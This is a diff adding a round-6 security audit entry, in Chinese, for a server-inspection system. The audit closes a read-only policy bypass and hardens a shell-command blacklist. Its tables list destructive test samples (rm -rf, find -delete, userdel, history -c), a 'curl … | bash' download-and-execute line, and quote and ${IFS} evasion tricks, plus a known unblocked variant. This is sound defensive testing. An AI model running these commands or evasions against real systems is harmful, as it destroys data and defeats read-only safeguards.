@@ -526,3 +526,138 @@
 > 此时心跳门控仍能防止误回收（同批有 run 在推进即可）；只有在**执行器进程整体停摆**时才会回收，
 > 可通过 `INSPECTION_STALE_RUN_SECONDS` 调整判定窗口。
 
+## 第 6 轮（2026-09-12）
+
+本轮范围：**巡检规则只读安全策略的一致性**（自定义 shell 规则的两条执行路径 + 黑名单强度）。
+
+### 一、已修复
+
+#### 6.1 【中危】项目组合巡检绕过只读策略，直接执行自定义规则原文
+
+- **缺陷**：自定义规则命令有两条执行路径，但只有一条做安全校验：
+
+  | 路径 | 入口 | 是否过净化器 |
+  | --- | --- | --- |
+  | A 单机 / 批量 / 方案巡检 | `execute_server_inspection_run` → `_rule_execution_specs` | ✅ 命中即 `blocked_reason`，不执行 |
+  | B 项目组合巡检 | `POST /api/v2/inspection/projects/{id}/combined-run` → `_server_checkers` → `_server_check_specs` → `_build_custom_rule_spec` → `_spec_from_rule_code` | ❌ 不调用净化器，也不看 `blocked_reason`，直接 `_remote_check` 下发 |
+
+  结果是同一条 `systemctl stop nginx` 自定义规则：在单机/批量/方案巡检里被拦，
+  在项目组合巡检里**真的在目标服务器上执行**——同一个"只读巡检"承诺出现绕过。
+- **修复**：`_spec_from_rule_code` 统一调用 `_sanitize_rule_shell` 并写入 `blocked_reason`；
+  `_server_checkers` 对带 `blocked_reason` 的 spec 走 `_blocked_rule_result`（状态 `SKIPPED`）而不下发命令。
+- **红灯证据**：`AssertionError: 被拦规则不应执行：'systemctl stop nginx\nrm -rf /data'`
+  （`_remote_check` 被真实调用），以及组合巡检 spec 缺 `blocked_reason` 的 `KeyError`。
+- **部署后实测**：模块探针规则（`systemctl stop nginx`）在 B 路径 `blocked_reason` 命中、
+  A 路径同样命中；只读探针规则两条路径均放行。
+
+#### 6.2 【中危】黑名单本身强度不足：13/24 破坏性写法可绕过，且已有误拦
+
+净化器是"只读巡检"的唯一运行时防线，本轮实测其实际强度（24 个样本）：
+
+| 类别 | 修复前 | 修复后 |
+| --- | --- | --- |
+| 破坏性样本被拦 | **11/24**（`rm -rf`、`chmod -R`、`dd of=`、`> /etc/`、`systemctl stop`、DML、`bash -c rm`、…） | **24/24** |
+| 破坏性样本漏网 | **13/24**（详见下表） | 0 |
+| 只读样本误拦 | **1/16**（`grep -E 'systemctl stop' /var/log/messages` 这类只读日志搜索被误杀） | 0 |
+
+修复前漏网样本（实测全部放行 ✗）：
+
+| 漏网写法 | 危害 | 原因 |
+| --- | --- | --- |
+| `rm /data/important.txt` | 删除文件 | 原正则要求 `rm` 后必须跟 `-` 参数 |
+| `find /data -delete` | 批量删除 | 未覆盖 `-delete` |
+| `sed -i s/a/b/ /etc/hosts` | 就地改写配置 | 未覆盖 `-i` |
+| `truncate -s 0 /var/log/syslog` | 清空日志 | 未覆盖 |
+| `crontab -r` / `history -c` | 清空定时任务 / 审计线索 | 未覆盖 |
+| `userdel ops` / `passwd ops` | 删号 / 改密 | 未覆盖 |
+| `mount -o remount,rw /` / `umount /data` | 重新挂载可写 / 卸载 | 未覆盖 |
+| `systemctl st"op" nginx`、`systemctl 'stop' nginx` | 停服务 | 关键字被引号拆分，正则按字面匹配 |
+| `rm${IFS}-rf /data` | 删除 | `${IFS}` 充当空格绕过 `\s+` |
+| `curl http://x/y.sh \| bash` | 下载即执行 | 未覆盖管道执行 |
+| `python3 -c "import shutil;shutil.rmtree('/data')"` | 任意破坏 | 未覆盖解释器一行式 |
+
+- **修复**：
+  1. 扫描前做**归一化**（不改下发命令）：`$IFS`/`${IFS}` → 空格，去掉引号与反斜杠
+     → 封堵 `st"op"`、`rebo\ot`、`rm${IFS}-rf` 这类纯语法绕过；
+  2. 补齐上述破坏性写法；每条规则都要求"命令词 + 参数"，避免误伤只读用法。
+- **零误拦验证**（关键安全网）：加固后 19 条内置规则、12 个内置巡检项命令**全部仍放行**；
+  收尾过程中曾因"一刀切拦 `find -exec`"与"未要求管道前空白"误拦 4 条内置规则
+  （`find … -exec tail`、`find … -exec sha256sum`、`ps -ef | egrep a|b|c|python|node …`），
+  已据此把规则收紧为 `-exec <破坏性命令>` 与 `\s\|\s*(python|node|sh|…)`，
+  并把这组"内置规则/命令永不被拦"固化为回归测试。
+- **局限（明确写入 docstring，非安全边界）**：黑名单只能拦住"明显破坏性"写法，
+  无法证明一条规则真的只读。真正的边界是"谁能编写规则"（管理端 + 审计）。
+  已知残留：管道前无空格的 `curl x|bash` 不拦（换取不误伤 `egrep a|b|sh` 这类只读交替）。
+
+#### 6.3 【低-中】命令存于 `config.commands` 的规则在组合巡检里被静默跳过
+
+- **缺陷**：`_rule_execution_specs` 支持 `rule_content` **或** `config.commands/shell/cmd`
+  两种命令来源，而组合巡检路径的 `_spec_from_rule_code` 只读 `rule_content`：
+  这类规则在组合巡检里**连一条结果行都不产生**（既无失败也无跳过），运维无从发现。
+- **修复**：`_spec_from_rule_code` 补上同一套 config 命令回退，再统一过净化器。
+- **红灯证据**：`AssertionError: config.commands 形式的规则不得被静默跳过 / assert 0 == 1`。
+
+#### 6.4 【低-中】同一分类挂多条规则时，组合巡检只执行第一条
+
+- **缺陷**：`_build_custom_rule_spec` 用 `.order_by(sort_order).first()` 只取一条，
+  而 `_server_check_specs` 每个分类只 append 一个 spec；主路径 `_rule_execution_specs`
+  却是"该分类下全部规则"。一个巡检项挂 2 条规则时：
+  组合巡检跑 1 条、单机/批量跑 2 条，另一条被静默丢弃。
+- **修复**：新增 `_build_custom_rule_specs()`（按 `sort_order` 收集 `InspectionItemRule`
+  全部关联 + 该分类全部启用规则并去重，逐条构建 spec），`_server_check_specs` 改为 extend；
+  `_build_custom_rule_spec` 保留为"取第一条"的兼容包装。
+- **红灯证据**：`AssertionError: 组合巡检 1 条 vs 单机/批量 2 条 / assert 1 == 2`。
+
+#### 6.5 规则接口新增 `command_policy`（作者侧可见，含内置规则）
+
+- 规则写路径（`create_rule`/`update_rule`）此前**只校验 `risk_level`/`scope_type`，完全不校验
+  `rule_content`**，作者无法预知自己的规则会不会在执行时被跳过。
+- 现在 `GET/POST/PATCH /inspection/rules` 的每条规则（含 16 条未落库的内置规则）都返回
+  `command_policy: {readonly_allowed, reason}`，与执行时的判定共用同一实现
+  （`_rule_command_policy` → `_sanitize_rule_shell`），`readonly_allowed=false` 即在执行时会被跳过。
+- **连带风险已处理**：`command_policy` 是展示字段，`_builtin_rule_by_code` 的
+  "剔除非模型字段"名单同步加入该键，否则编辑内置规则时
+  `InspectionRule(**base)` 会 `TypeError`；已补回归用例
+  `test_builtin_rule_can_still_be_materialized`。
+
+### 二、已排除 / 记录（本轮审计结论，避免误修）
+
+| 审计项 | 结论 |
+| --- | --- |
+| 是否已有"执行任意命令"的 MCP 工具绕过巡检策略 | **没有**：`app/services/tool_adapters/` 下无通用命令执行适配器；工具层最高风险写入工具均带确认闸门（第 4 轮结论） |
+| 画像 / 问题重试路径是否也绕过策略 | 未绕过：`inspection_profiles.run_profile` / `run_issue_retry` 都走 `run_servers_batch_inspection` → 净化路径 |
+| 项目侧规则路径（`_project_rule_check_specs`） | 复用 `_rule_execution_specs`，本就净化 ✅ |
+| `app/services/inspection.py` | **死模块**（全仓无调用方，仅硬编码只读命令），存在同样的净化缺失但不可达，本轮不改，仅记录 |
+| `find`/`grep`/`ps` 等只读统计写法 | 全部保留放行（含 `find -printf/-ls/-exec tail`、`ps -ef \| egrep a\|b\|c`），已固化为测试 |
+
+### 三、待办（后续轮次）
+
+- 巡检域剩余：20+ 个 analyzer 的业务判定口径逐个复核（本轮只覆盖策略与执行路径）。
+- 前端竞态与假交互；部署/执行/维护链路确认闸门与回滚一致性；批量改 `auth_type` 不校验新凭据。
+- 剩余 `except: pass` 静默失败分诊（巡检域已见 `inspection_periodic_report_payload` 吞掉明细异常）。
+- MCP 工具描述正向漂移批量校准；`update_issue` 状态机（重开时 `fixed_at`/`verified_at` 残留）。
+- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。
+
+### 附：第 6 轮可复现的验证脚本
+
+- `tests/test_inspection_rule_policy_scope.py`（57 项）：两路径判定一致、被拦规则不下发、
+  多规则分类全部执行、config 命令来源、净化器双向表驱动（24 破坏 + 19 只读）、内置规则零误拦；
+- `fnos-migration/_verify_round6_sanitizer.py`（未入库）：内置规则/命令零误拦 + 绕过样本收敛；
+- `fnos-migration/_verify_round6_rules.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测。
+
+#### 部署后实测证据（2026-09-12，OPS 重启后 PID 20584；18 项断言全部 OK）
+
+| 实测项 | 结果 |
+| --- | --- |
+| `GET /api/v2/inspection/rules` | HTTP 200，**19/19** 条规则都带 `command_policy`，内置规则全部 `readonly_allowed=true` |
+| `POST /inspection/rules`（`systemctl stop nginx` 探针） | HTTP 200，返回 `readonly_allowed=false` + 拦截原因（策略在执行时拦截，不在写入时拒绝新规则） |
+| `POST /inspection/rules`（`df -PTh` 探针） | HTTP 200，返回 `readonly_allowed=true` |
+| 服务层 A 路径（`_rule_execution_specs`） | 危险探针命中 `blocked_reason`；只读探针放行 |
+| 服务层 B 路径（`_server_check_specs`，即组合巡检） | 危险探针命中 `blocked_reason`（修复前会下发执行）；只读探针放行；同分类 2 条规则均生成 spec |
+| 生产数据复原 | 规则 3→3、巡检项配置 16→16、巡检项关联 17→17，无残留探针；接口可见 19→19 条 |
+| 全量测试套件 | `pytest tests/ -q` → **1456 passed**（第 5 轮 1399 + 本轮新增 57） |
+
+> 运维提示：本轮只改后端，**需重启 OPS 生效**（前端无改动，无需 Ctrl+F5）。
+> 规则编辑器可读取 `command_policy.readonly_allowed` 提前给出"该规则执行时会被跳过"的提示；
+> 该字段缺失时（老客户端）行为不变，规则照旧在执行时被拦截。
+
